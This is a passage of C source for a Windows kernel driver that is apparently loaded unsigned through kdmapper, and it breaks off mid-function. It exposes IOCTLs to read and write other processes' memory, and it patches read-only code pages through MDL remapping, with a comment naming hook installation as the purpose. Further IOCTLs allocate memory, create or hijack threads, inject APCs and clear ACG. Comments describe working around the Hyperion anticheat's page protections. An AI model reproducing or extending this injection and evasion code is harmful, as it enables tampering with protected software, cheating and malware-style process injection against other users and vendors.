#define CAT_IMAGE_NT_SIGNATURE  0x00004550 /* "PE\0\0" */

/* RtlAddFunctionTable registers the driver's SEH unwind data (.pdata) with
 * the kernel so x64 exception dispatch can find our __try/__except scopes.
 *
 * CRITICAL for kdmapper-loaded drivers: the normal driver loader registers
 * the function table automatically from the PE's EXCEPTION_DIRECTORY. kdmapper
 * raw-maps the image and does NOT register pdata. Without registration, any
 * fault inside catdriver's own code cannot be SEH-dispatched — the kernel's
 * MiBadAccess classifies it as a driver bug and bugchecks (0x1E / 0x50).
 *
 * Observed: touch-probe byte read in CatSafeReadFromProcess faulted on an
 * unmapped user page under __try — but SEH never ran, kernel bugchecked
 * 0x1E instead. The __try/__except frames exist in the code but the
 * unwinder can't locate them without a registered function table. */
typedef BOOLEAN (NTAPI *PFN_RtlAddFunctionTable)(
    IN PCAT_RUNTIME_FUNCTION FunctionTable,
    IN ULONG EntryCount,
    IN ULONG64 BaseAddress
);

/* Locate the .pdata (exception directory) in our mapped PE and register it.
 * The exception directory sits at a well-known fixed offset in the x64
 * OptionalHeader (DataDirectory[3]). We hop into the OptionalHeader via
 * known field offsets rather than defining the full PE64 header struct. */
static VOID CatRegisterOwnFunctionTable(PVOID imageBase)
{
    if (!imageBase) return;

    PCAT_IMAGE_DOS_HEADER dos = (PCAT_IMAGE_DOS_HEADER)imageBase;
    if (dos->e_magic != CAT_IMAGE_DOS_SIGNATURE) {
        DbgPrint("[CatDriver] PDATA: bad DOS signature\n");
        return;
    }

    PUCHAR ntHeader = (PUCHAR)imageBase + dos->e_lfanew;
    ULONG ntSig = *(ULONG*)ntHeader;
    if (ntSig != CAT_IMAGE_NT_SIGNATURE) {
        DbgPrint("[CatDriver] PDATA: bad NT signature\n");
        return;
    }

    /* IMAGE_NT_HEADERS64 layout:
     *   +0x00  Signature (4 bytes)
     *   +0x04  FileHeader (20 bytes)
     *   +0x18  OptionalHeader
     * OptionalHeader64 layout:
     *   +0x00  Magic + ...
     *   +0x70  DataDirectory[0]
     *   +0x78  DataDirectory[1]
     *   +0x88  DataDirectory[3] (EXCEPTION)
     * So EXCEPTION directory is at FileHeader-end + 0x70 + 3*sizeof(IMAGE_DATA_DIRECTORY). */
    PUCHAR optHeader = ntHeader + 0x18;  /* Signature(4) + FileHeader(20) */
    CAT_IMAGE_DATA_DIRECTORY exDir =
        *(CAT_IMAGE_DATA_DIRECTORY*)(optHeader + 0x70 +
            CAT_IMAGE_DIRECTORY_ENTRY_EXCEPTION * sizeof(CAT_IMAGE_DATA_DIRECTORY));

    if (exDir.VirtualAddress == 0 || exDir.Size == 0) {
        DbgPrint("[CatDriver] PDATA: image has no exception directory\n");
        return;
    }

    PCAT_RUNTIME_FUNCTION table = (PCAT_RUNTIME_FUNCTION)((PUCHAR)imageBase + exDir.VirtualAddress);
    ULONG count = exDir.Size / sizeof(CAT_RUNTIME_FUNCTION);

    UNICODE_STRING name;
    RtlInitUnicodeString(&name, L"RtlAddFunctionTable");
    PFN_RtlAddFunctionTable pRtlAdd =
        (PFN_RtlAddFunctionTable)MmGetSystemRoutineAddress(&name);
    if (!pRtlAdd) {
        DbgPrint("[CatDriver] PDATA: RtlAddFunctionTable not exported — SEH broken\n");
        return;
    }

    BOOLEAN ok = pRtlAdd(table, count, (ULONG64)imageBase);
    DbgPrint("[CatDriver] PDATA: RtlAddFunctionTable table=%p count=%u base=%p ok=%d\n",
             table, count, imageBase, ok);
}

#pragma warning(push)
#pragma warning(disable: 4028)
NTSTATUS DriverEntry(
    _In_ PVOID MappedBase,
    _In_ PVOID ImageSize
)
{
    UNREFERENCED_PARAMETER(ImageSize);

    DbgPrint("[CatDriver] Meow! Manual-mapped entry. Base=%p\n", MappedBase);

    /* Register our own PE exception directory with the kernel's unwinder
     * so __try/__except in this driver actually works. Without this,
     * every __try is a lie — faults bugcheck. */
    CatRegisterOwnFunctionTable(MappedBase);

    return IoCreateDriver(NULL, CatRealInit);
}
#pragma warning(pop)


/* ================================================================
 * CatUnload — the cat goes to sleep
 * Clean up everything. Leave no fur behind.
 * ================================================================ */
VOID CatUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING symlinkName;

    DbgPrint("[CatDriver] Unloading... goodbye, cruel ring0 world.\n");

    RtlInitUnicodeString(&symlinkName, CAT_SYMLINK_NAME);
    IoDeleteSymbolicLink(&symlinkName);

    if (DriverObject->DeviceObject) {
        IoDeleteDevice(DriverObject->DeviceObject);
    }

    DbgPrint("[CatDriver] Unloaded. *poof*\n");
}


/* ================================================================
 * CatDispatchCreate / CatDispatchClose
 * Just say yes. We're a friendly cat.
 * ================================================================ */
NTSTATUS CatDispatchCreate(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    DbgPrint("[CatDriver] Handle opened. Welcome, hooman.\n");
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS CatDispatchClose(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    DbgPrint("[CatDriver] Handle closed. Come back soon.\n");
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}


/* ================================================================
 * CatDispatchDeviceControl — the main event
 * Routes incoming IOCTLs to the appropriate handler.
 * This is where the magic happens. 🪄
 * ================================================================ */
NTSTATUS CatDispatchDeviceControl(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    /* R0 row #11: IOCTL path must execute at ≤ APC_LEVEL — every handler
     * below calls paged primitives (KeStackAttachProcess, Ps* lookups,
     * ExAllocatePoolWithTag). PAGED_CODE catches a raised-IRQL regression at
     * test time instead of letting it corrupt the kernel at runtime. */
    PAGED_CODE();

    /* R0 rows #7/9/10: lazy OS-offset discovery. First IOCTL has a valid
     * user-mode TrapFrame populated so KTHREAD scan can anchor on it;
     * DriverEntry context doesn't. One-shot (g_OsOffsetsDone guard). */
    CatDiscoverOsOffsets();

    NTSTATUS            status;
    PIO_STACK_LOCATION  ioStack;
    ULONG               ioControlCode;
    BOOLEAN             unloadDeferred = FALSE;

    ioStack = IoGetCurrentIrpStackLocation(Irp);
    ioControlCode = ioStack->Parameters.DeviceIoControl.IoControlCode;

    switch (ioControlCode)
    {
    case IOCTL_CAT_READ_MEMORY:
        status = CatReadMemory(Irp, ioStack);
        break;

    case IOCTL_CAT_WRITE_MEMORY:
        status = CatWriteMemory(Irp, ioStack);
        break;

    case IOCTL_CAT_GET_PID:
        status = CatGetPid(Irp, ioStack);
        break;

    case IOCTL_CAT_GET_MODULE_BASE:
        status = CatGetModuleBase(Irp, ioStack);
        break;

    case IOCTL_CAT_GET_TEB:
        status = CatGetTeb(Irp, ioStack);
        break;

    case IOCTL_CAT_GET_TEBS_BULK:
        status = CatGetTebsBulk(Irp, ioStack);
        break;

    case IOCTL_CAT_PING:
        status = CatPing(Irp, ioStack);
        break;

    case IOCTL_CAT_PROTECT_MEM:
        status = CatProtectMem(Irp, ioStack);
        break;

    case IOCTL_CAT_WRITE_MDL:
        status = CatWriteMdlIoctl(Irp, ioStack);
        break;

    case IOCTL_CAT_CLEAR_ACG:
        status = CatClearAcg(Irp, ioStack);
        break;

    case IOCTL_CAT_UNLOAD:
        DbgPrint("[CatDriver] Unload requested. Will self-destruct after IRP completion.\n");
        /* MUST NOT delete device here — the IRP is still in flight on
         * this device object. Driver Verifier bugchecks 0xC9 subcode
         * 0x230 / 0x23D on "complete IRP against freed device"; even
         * without verifier, the IRP queue can be left in a corrupt
         * state. Defer until after IoCompleteRequest below. */
        unloadDeferred = TRUE;
        Irp->IoStatus.Information = 0;
        status = STATUS_SUCCESS;
        break;

    case IOCTL_CAT_DIAG_READ:
        status = CatDiagRead(Irp, ioStack);
        break;

    case IOCTL_CAT_ATTACHED_READ:
        status = CatAttachedRead(Irp, ioStack);
        break;

    case IOCTL_CAT_ALLOC_MEM:
        status = CatAllocMem(Irp, ioStack);
        break;

    case IOCTL_CAT_CREATE_THREAD:
        status = CatCreateThread(Irp, ioStack);
        break;

    case IOCTL_CAT_APC_INJECT:
        status = CatApcInject(Irp, ioStack);
        break;

    case IOCTL_CAT_HIJACK_THREAD:
        status = CatHijackThread(Irp, ioStack);
        break;

    case IOCTL_CAT_SPECIAL_APC:
        status = CatSpecialApc(Irp, ioStack);
        break;

    case IOCTL_CAT_FREEZE_PROCESS:
        status = CatFreezeProcess(Irp, ioStack);
        break;

    case IOCTL_CAT_THAW_PROCESS:
        status = CatThawProcess(Irp, ioStack);
        break;

    case IOCTL_CAT_INSTRUMENT:
        status = CatSetInstrumentation(Irp, ioStack);
        break;

    default:
        DbgPrint("[CatDriver] Unknown IOCTL: 0x%08X. Hissss.\n", ioControlCode);
        status = STATUS_INVALID_DEVICE_REQUEST;
        Irp->IoStatus.Information = 0;
        break;
    }

    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    /* Safe to tear down the device now — the IRP has been handed back
     * to the I/O manager. See the IOCTL_CAT_UNLOAD comment above. */
    if (unloadDeferred) {
        UNICODE_STRING symName;
        RtlInitUnicodeString(&symName, CAT_SYMLINK_NAME);
        IoDeleteSymbolicLink(&symName);
        IoDeleteDevice(DeviceObject);
    }

    return status;
}


/* CatReadMdl and CatReadPhysical have been removed — they were defined
 * but never called. The DISABLED comment blocks in CatReadMemory /
 * CatWriteMemory document why the MDL / physical fallbacks are not used:
 * both raise exceptions past the syscall boundary (SEH-uncatchable 0x1E)
 * on Hyperion-protected or torn pages. If a future caller needs them,
 * reintroduce them WITH touch-probe pre-validation similar to
 * CatSafeReadFromProcess. */

/* ================================================================
 * CatReadPhysMem — read physical memory via MmCopyMemory
 *
 * MmMapIoSpace bugchecks on RAM (Win11 26200+).
 * MDL PFN trick bugchecks if PFN isn't in the PFN database.
 * MmCopyMemory is the ONLY safe way — it never bugchecks,
 * handles all edge cases, returns proper NTSTATUS.
 * ================================================================ */
static NTSTATUS CatReadPhysMem(ULONG64 physAddr, PVOID dest, SIZE_T size) {
    MM_COPY_ADDRESS srcAddr;
    SIZE_T transferred = 0;
    /* R0 row #3: cheap null-reject. MmCopyMemory itself handles invalid /
     * out-of-range PFNs by returning STATUS_INVALID_ADDRESS (per comment on
     * line ~584) — no need for an explicit MmHighestPhysicalPage ceiling,
     * which would require importing a data symbol that MSVC's kernel-mode
     * linker treats specially. */
    if (physAddr == 0) return STATUS_INVALID_ADDRESS;
    srcAddr.PhysicalAddress.QuadPart = (LONGLONG)physAddr;
    return MmCopyMemory(dest, srcAddr, size, MM_COPY_MEMORY_PHYSICAL, &transferred);
}

/* ================================================================
 * CatReadPageWalk — CR3 page table walk (nuclear option)
 *
 * Manually walks PML4 -> PDPT -> PD -> PT using the process's
 * DirectoryTableBase from EPROCESS. Uses MDL-based mapping
 * (not MmMapIoSpace) to safely read physical RAM pages.
 * Bypasses ALL software page protections.
 * ================================================================ */
#define PTE_PRESENT     0x001ULL
#define PTE_LARGE_PAGE  0x080ULL
#define PTE_PFN_MASK    0x000FFFFFFFFFF000ULL

/* R0 row #3: PTE bits 52..58 are "reserved — must be zero" per Intel SDM
 * section on 4-level paging. Hyperion's PFN-of-nowhere trick sometimes
 * manipulates these to confuse walkers; a non-zero reserved-bits field is
 * a reliable "do not dereference" signal that avoids a PFN-database miss. */
#define PTE_RESERVED_HI_MASK 0x07F0000000000000ULL

static ULONG64 CatReadPteEntry(ULONG64 tablePhysBase, ULONG index) {
    ULONG64 entry = 0;
    ULONG64 entryPhys = (tablePhysBase & PTE_PFN_MASK) + (ULONG64)index * sizeof(ULONG64);
    /* R0 row #3: CatReadPhysMem returns a proper NTSTATUS on bad PFN; use that
     * instead of a ceiling check (keeping us free of the data-symbol import
     * dance). */
    if (!NT_SUCCESS(CatReadPhysMem(entryPhys, &entry, sizeof(entry)))) return 0;
    /* Reject entries with reserved-high bits set — likely tampered. */
    if (entry & PTE_RESERVED_HI_MASK) return 0;
    return entry;
}

static NTSTATUS CatReadPageWalk(
    PEPROCESS targetProcess,
    PVOID     sourceAddress,
    PVOID     destBuffer,
    SIZE_T    size,
    PSIZE_T   outBytesCopied
)
{
    SIZE_T copied = 0;
    ULONG_PTR dtb;

    __try {
        /* R0 row #9: runtime-discovered EPROCESS.DirectoryTableBase offset. */
        dtb = *(ULONG_PTR*)((ULONG_PTR)targetProcess + CatGetDtbOff());
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        *outBytesCopied = 0;
        return STATUS_ACCESS_VIOLATION;
    }

    if (dtb == 0) {
        *outBytesCopied = 0;
        return STATUS_UNSUCCESSFUL;
    }

    __try {
        while (copied < size) {
            ULONG_PTR va = (ULONG_PTR)sourceAddress + copied;
            SIZE_T pageOffset = va & 0xFFF;
            SIZE_T bytesThisPage = 0x1000 - pageOffset;
            if (copied + bytesThisPage > size)
                bytesThisPage = size - copied;

            ULONG64 entry;
            ULONG64 physAddr;

            entry = CatReadPteEntry(dtb, (ULONG)((va >> 39) & 0x1FF));
            if (!(entry & PTE_PRESENT)) break;

            entry = CatReadPteEntry(entry, (ULONG)((va >> 30) & 0x1FF));
            if (!(entry & PTE_PRESENT)) break;
            if (entry & PTE_LARGE_PAGE) {
                physAddr = (entry & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
                goto do_copy;
            }

            entry = CatReadPteEntry(entry, (ULONG)((va >> 21) & 0x1FF));
            if (!(entry & PTE_PRESENT)) break;
            if (entry & PTE_LARGE_PAGE) {
                physAddr = (entry & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL);
                goto do_copy;
            }

            entry = CatReadPteEntry(entry, (ULONG)((va >> 12) & 0x1FF));
            if (!(entry & PTE_PRESENT)) break;

            physAddr = (entry & PTE_PFN_MASK) | pageOffset;

        do_copy:
            {
                NTSTATUS copyStatus = CatReadPhysMem(
                    physAddr,
                    (PVOID)((ULONG_PTR)destBuffer + copied),
                    bytesThisPage
                );
                if (!NT_SUCCESS(copyStatus)) break;
                copied += bytesThisPage;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        /* page walk crashed mid-loop — return what we got */
    }

    *outBytesCopied = copied;
    return (copied > 0) ? STATUS_SUCCESS : STATUS_ACCESS_VIOLATION;
}


/* ================================================================
 * CatDiagRead — diagnostic IOCTL handler
 *
 * Tries every read method independently and reports status from
 * each one plus page table walk details. 64 bytes max.
 * ================================================================ */
static NTSTATUS CatDiagRead(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    PCAT_DIAG_REQUEST request;
    PCAT_DIAG_RESPONSE response;
    PEPROCESS targetProcess = NULL;
    NTSTATUS status;
    SIZE_T bytesCopied;

    if (IoStack->Parameters.DeviceIoControl.InputBufferLength < CAT_DIAG_INPUT_SIZE ||
        IoStack->Parameters.DeviceIoControl.OutputBufferLength < CAT_DIAG_OUTPUT_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    request = (PCAT_DIAG_REQUEST)Irp->AssociatedIrp.SystemBuffer;
    response = (PCAT_DIAG_RESPONSE)Irp->AssociatedIrp.SystemBuffer;

    ULONG pid = request->ProcessId;
    ULONGLONG addr = request->Address;

    RtlZeroMemory(response, sizeof(CAT_DIAG_RESPONSE));

    /* Sync-holding lookup: PsAcquireProcessExitSynchronization held across
     * MmCopyVirtualMemory to prevent 0x50 PAGE_FAULT_IN_NONPAGED_AREA from
     * VAD teardown mid-copy. */
    status = CatLookupLiveProcessSync(pid, &targetProcess);
    if (!NT_SUCCESS(status)) {
        Irp->IoStatus.Information = 0;
        return status;
    }

    /* R0 row #9: runtime-discovered EPROCESS.DirectoryTableBase offset. */
    response->cr3Value = *(ULONGLONG*)((ULONG_PTR)targetProcess + CatGetDtbOff());

    /* walk page tables for diagnostics (protected) */
    __try {
        ULONG_PTR va = (ULONG_PTR)addr;
        ULONG64 dtb = response->cr3Value;
        if (dtb) {
            response->pml4Entry = CatReadPteEntry(dtb, (ULONG)((va >> 39) & 0x1FF));
            if (response->pml4Entry & PTE_PRESENT) {
                response->pdptEntry = CatReadPteEntry(response->pml4Entry, (ULONG)((va >> 30) & 0x1FF));
                if ((response->pdptEntry & PTE_PRESENT) && !(response->pdptEntry & PTE_LARGE_PAGE)) {
                    response->pdEntry = CatReadPteEntry(response->pdptEntry, (ULONG)((va >> 21) & 0x1FF));
                    if ((response->pdEntry & PTE_PRESENT) && !(response->pdEntry & PTE_LARGE_PAGE)) {
                        response->ptEntry = CatReadPteEntry(response->pdEntry, (ULONG)((va >> 12) & 0x1FF));
                        if (response->ptEntry & PTE_PRESENT)
                            response->physAddress = (response->ptEntry & PTE_PFN_MASK) | (va & 0xFFF);
                    } else if (response->pdEntry & PTE_LARGE_PAGE) {
                        response->physAddress = (response->pdEntry & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL);
                    }
                } else if (response->pdptEntry & PTE_LARGE_PAGE) {
                    response->physAddress = (response->pdptEntry & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
                }
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        /* page walk crashed — leave whatever we got */
    }

    /* Method 1: attached touch-probe + copy. Replaces MmCopyVirtualMemory,
     * which bugchecks on unmapped user VAs (0x50) despite being wrapped
     * in SEH — the kernel's MiBadAccess bypasses SEH dispatch. */
    bytesCopied = 0;
    response->mmCopyStatus = (LONG)CatSafeReadFromProcess(
        targetProcess, (PVOID)addr, response->data, CAT_DIAG_DATA_SIZE, &bytesCopied
    );
    if (NT_SUCCESS((NTSTATUS)response->mmCopyStatus) && bytesCopied == CAT_DIAG_DATA_SIZE) {
        response->whichWorked = 1;
        goto diag_done;
    }

    /* Methods 2 & 3 DISABLED — MmProbeAndLockPages and MmGetPhysicalAddress
     * can KeBugCheckEx on execute-only pages, bypassing __try/__except */
    response->mdlStatus = (LONG)0xC0000022L;   /* STATUS_ACCESS_DENIED */
    response->physStatus = (LONG)0xC0000022L;

    /* Method 4 DISABLED — CatReadPageWalk relies on MmCopyMemory with
     * physical addresses derived from a CR3 page-table walk. The walk
     * can produce PFNs outside installed RAM (prototype/transition PTEs,
     * MMIO ranges, Hyperion-manipulated PFN fields), and MmCopyMemory
     * on an out-of-RAM physical bugchecks 0x50 PAGE_FAULT_IN_NONPAGED_
     * AREA on some builds — SEH-uncatchable. The fuzzer exercises
     * DIAG_READ with random VAs; when method 1 (touch-probe) rejects a
     * weird-but-mapped VA, falling into the page walk is a dice roll on
     * a bugcheck. Report as not-supported; CatReadPageWalk and
     * CatReadPhysMem remain in the source for a future, better-gated
     * reintroduction. */
    response->pageWalkStatus = (LONG)STATUS_NOT_SUPPORTED;

diag_done:
    CatReleaseLiveProcessSync(targetProcess);
    Irp->IoStatus.Information = sizeof(CAT_DIAG_RESPONSE);
    return STATUS_SUCCESS;
}


/* ================================================================
 * CatReadMemory — peek into another process's memory
 *
 * Tries four methods in order:
 * 1. MmCopyVirtualMemory (normal readable pages)
 * 2. MDL-based (bypasses execute-only PTE)
 * 3. MmGetPhysicalAddress + MmMapIoSpace (physical fallback)
 * 4. CR3 page table walk (nuclear option)
 * ================================================================ */
static NTSTATUS CatReadMemory(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    NTSTATUS            status;
    PCAT_READ_REQUEST   request;
    ULONG               inputLen;
    ULONG               outputLen;
    PEPROCESS           targetProcess = NULL;
    SIZE_T              bytesCopied = 0;

    inputLen = IoStack->Parameters.DeviceIoControl.InputBufferLength;
    outputLen = IoStack->Parameters.DeviceIoControl.OutputBufferLength;

    /* Validate input */
    if (inputLen < CAT_READ_INPUT_SIZE) {
        DbgPrint("[CatDriver] READ: Input too small (%u < %u)\n",
                 inputLen, (ULONG)CAT_READ_INPUT_SIZE);
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    request = (PCAT_READ_REQUEST)Irp->AssociatedIrp.SystemBuffer;

    /* Sanity checks */
    if (request->Size == 0 || request->Size > CAT_MAX_TRANSFER_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_INVALID_PARAMETER;
    }

    if (outputLen < request->Size) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    /* User-VA range check. CatIsValidUserVa rejects nullish, kernel-range,
     * out-of-range, and arithmetic-overflow cases. Without this,
     * MmCopyVirtualMemory + KernelMode would deref whatever we hand it. */
    if (!CatIsValidUserVa(request->Address, request->Size)) {
        DbgPrint("[CatDriver] READ: rejected bogus user VA 0x%llX (size %u)\n",
                 request->Address, request->Size);
        Irp->IoStatus.Information = 0;
        return STATUS_INVALID_PARAMETER;
    }

    /* Look up the target process + hold PsAcquireProcessExitSynchronization
     * across the MmCopyVirtualMemory call to prevent 0x50 PAGE_FAULT_IN_
     * NONPAGED_AREA when the target's VAD tree / PTEs are being torn down. */
    status = CatLookupLiveProcessSync(request->ProcessId, &targetProcess);

    if (!NT_SUCCESS(status)) {
        Irp->IoStatus.Information = 0;
        return status;
    }

    /* Attached touch-probe + copy. Replaces MmCopyVirtualMemory, which
     * bugchecks on unmapped source VAs under PreviousMode=KernelMode. */
    status = CatSafeReadFromProcess(
        targetProcess,
        (PVOID)request->Address,
        Irp->AssociatedIrp.SystemBuffer,
        request->Size,
        &bytesCopied
    );

    /* Methods 2 & 3 DISABLED — bugcheck on execute-only pages */

    /* PAGE-WALK FALLBACK DISABLED — June 2026.
     *
     * Was: if (!NT_SUCCESS(status)) { CatReadPageWalk(...); }
     *
     * The nuclear page-walk path resolves a virtual address to a physical
     * frame via CR3 + PML4/PDPT/PD/PT walk, then maps the physical page
     * through MmCopyMemory(MM_COPY_MEMORY_PHYSICAL). That works on benign
     * heap memory but BSODs with PAGE_FAULT_IN_NONPAGED_AREA when:
     *   - The PTE has had its PFN field manipulated by anticheat
     *     (Hyperion does this on protected pages — the PFN points to
     *     a frame outside installed RAM)
     *   - The physical address falls in MMIO / device-reserved ranges
     *   - A race with the target process unmapping the page mid-walk
     *
     * SEH cannot catch these because PFN-of-nowhere accesses are
     * bugchecks, not structured exceptions. CatDumper's section scans
     * touch enough pages that the failure is statistically inevitable.
     *
     * Neither CatDumper nor CatClient actually needs the nuclear option
     * (all heap reads MmCopyVirtualMemory handles, all .text reads
     * MmCopyVirtualMemory handles because EXECUTE_READ is fine).
     * If a future tool needs it, re-enable AFTER hardening
     * CatReadPhysMem with MmHighestPhysicalPage validation and a
     * stricter PTE reserved-bits check.
     *
     * CatReadPageWalk and CatReadPhysMem remain in the source but are
     * only reachable through CatDiagRead now.
     */

    CatReleaseLiveProcessSync(targetProcess);

    if (NT_SUCCESS(status)) {
        Irp->IoStatus.Information = bytesCopied;
    } else {
        Irp->IoStatus.Information = 0;
    }

    return status;
}


/* ================================================================
 * CatWriteMdl — MDL-based write for read-only pages (.text)
 *
 * MmCopyVirtualMemory respects page protections and fails on
 * PAGE_EXECUTE_READ. MDL approach: lock the physical pages,
 * map them into kernel space as writable, copy data in.
 * KernelMode probe skips VAD protection checks.
 * ================================================================ */
static NTSTATUS CatWriteMdl(
    PEPROCESS targetProcess,
    PVOID     targetAddress,
    PVOID     sourceBuffer,
    SIZE_T    size,
    PSIZE_T   outBytesWritten
)
{
    KAPC_STATE apcState;
    PMDL mdl = NULL;
    NTSTATUS status = STATUS_ACCESS_VIOLATION;

    *outBytesWritten = 0;

    KeStackAttachProcess(targetProcess, &apcState);

    mdl = IoAllocateMdl(targetAddress, (ULONG)size, FALSE, FALSE, NULL);
    if (!mdl) {
        KeUnstackDetachProcess(&apcState);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    __try {
        MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        IoFreeMdl(mdl);
        KeUnstackDetachProcess(&apcState);
        return GetExceptionCode();
    }

    KeUnstackDetachProcess(&apcState);

    __try {
        PVOID mapped = MmMapLockedPagesSpecifyCache(
            mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority
        );

        if (mapped) {
            NTSTATUS protStatus = MmProtectMdlSystemAddress(mdl, PAGE_READWRITE);
            if (NT_SUCCESS(protStatus)) {
                RtlCopyMemory(mapped, sourceBuffer, size);
                *outBytesWritten = size;
                status = STATUS_SUCCESS;
            } else {
                DbgPrint("[CatDriver] WRITE_MDL: MmProtectMdlSystemAddress=0x%08X\n", protStatus);
                status = protStatus;
            }
            MmUnmapLockedPages(mapped, mdl);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
        DbgPrint("[CatDriver] WRITE_MDL: Exception 0x%08X\n", (ULONG)status);
    }

    MmUnlockPages(mdl);
    IoFreeMdl(mdl);

    return status;
}


/* ================================================================
 * CatWriteMdlIoctl — IOCTL wrapper for CatWriteMdl.
 *
 * Explicit opt-in path for callers that KNOW the target VA range is
 * a normal PE-loaded page (e.g. .text hook install). Pre-validates
 * each 4 KB page inside the attached process with MmIsAddressValid
 * before calling MmProbeAndLockPages — that catches unmapped / guard
 * / mid-teardown pages up-front, avoiding the SEH-uncatchable
 * exception mode that made the fallback inside CatWriteMemory unsafe.
 *
 * Request layout is identical to IOCTL_CAT_WRITE_MEMORY:
 *   CAT_WRITE_REQUEST { pid, address, size, data[] }
 * ================================================================ */
static NTSTATUS CatWriteMdlIoctl(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    NTSTATUS            status;
    PCAT_WRITE_REQUEST  request;
    ULONG               inputLen;
    PEPROCESS           targetProcess = NULL;
    SIZE_T              bytesWritten = 0;

    inputLen = IoStack->Parameters.DeviceIoControl.InputBufferLength;

    if (inputLen < CAT_WRITE_MIN_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    request = (PCAT_WRITE_REQUEST)Irp->AssociatedIrp.SystemBuffer;

    if (request->Size == 0 || request->Size > CAT_MAX_TRANSFER_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_INVALID_PARAMETER;
    }
    if (inputLen < CAT_WRITE_MIN_SIZE + request->Size) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    if (!CatIsValidUserVa(request->Address, request->Size)) {
        DbgPrint("[CatDriver] WRITE_MDL: rejected bogus user VA 0x%llX (size %u)\n",
                 request->Address, request->Size);
        Irp->IoStatus.Information = 0;
        return STATUS_INVALID_PARAMETER;
    }

    status = CatLookupLiveProcessSync(request->ProcessId, &targetProcess);
    if (!NT_SUCCESS(status)) {
        Irp->IoStatus.Information = 0;
        return status;
    }

    /* Pre-validate every 4 KB page in the range under the target's
     * address space. If any page comes back invalid, refuse — better
     * to return STATUS_INVALID_ADDRESS than to hand a shaky VA to
     * MmProbeAndLockPages. */
    KAPC_STATE checkState;
    BOOLEAN allValid = TRUE;
    KeStackAttachProcess(targetProcess, &checkState);
    __try {
        ULONG_PTR startPage = ((ULONG_PTR)request->Address) & ~((ULONG_PTR)0xFFF);
        ULONG_PTR endAddr   = ((ULONG_PTR)request->Address) + request->Size;
        for (ULONG_PTR p = startPage; p < endAddr; p += 0x1000) {
            if (!MmIsAddressValid((PVOID)p)) {
                DbgPrint("[CatDriver] WRITE_MDL: page 0x%llX not valid, refusing\n", (ULONGLONG)p);
                allValid = FALSE;
                break;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[CatDriver] WRITE_MDL: pre-validate exception 0x%08X\n", (ULONG)GetExceptionCode());
        allValid = FALSE;
    }
    KeUnstackDetachProcess(&checkState);

    if (!allValid) {
        CatReleaseLiveProcessSync(targetProcess);
        Irp->IoStatus.Information = 0;
        return STATUS_INVALID_ADDRESS;
    }

    /* Delegate to the MDL write helper. It re-attaches internally. */
    status = CatWriteMdl(
        targetProcess,
        (PVOID)request->Address,
        (PVOID)request->Data,
        (SIZE_T)request->Size,
        &bytesWritten);

    CatReleaseLiveProcessSync(targetProcess);

    if (NT_SUCCESS(status)) {
        Irp->IoStatus.Information = bytesWritten;
    } else {
        DbgPrint("[CatDriver] WRITE_MDL: CatWriteMdl failed 0x%08X\n", (ULONG)status);
        Irp->IoStatus.Information = 0;
    }
    return status;
}


/* ================================================================
 * CatWriteMemory — scribble into another process's memory
 *
 * Tries MmCopyVirtualMemory first (works for writable pages).
 * Falls back to MDL-based write for read-only pages (.text).
 *
 * The input buffer contains the header + data:
 *   [CAT_WRITE_REQUEST header][actual data bytes...]
 * ================================================================ */
static NTSTATUS CatWriteMemory(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    NTSTATUS            status;
    PCAT_WRITE_REQUEST  request;
    ULONG               inputLen;
    PEPROCESS           targetProcess = NULL;
    SIZE_T              bytesCopied = 0;

    inputLen = IoStack->Parameters.DeviceIoControl.InputBufferLength;

    /* Need at least the header */
    if (inputLen < CAT_WRITE_MIN_SIZE) {
        DbgPrint("[CatDriver] WRITE: Input too small\n");
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    request = (PCAT_WRITE_REQUEST)Irp->AssociatedIrp.SystemBuffer;

    /* Validate: the input buffer should be header + Size bytes of data */
    if (request->Size == 0 || request->Size > CAT_MAX_TRANSFER_SIZE) {
        DbgPrint("[CatDriver] WRITE: Invalid size %u\n", request->Size);
        Irp->IoStatus.Information = 0;
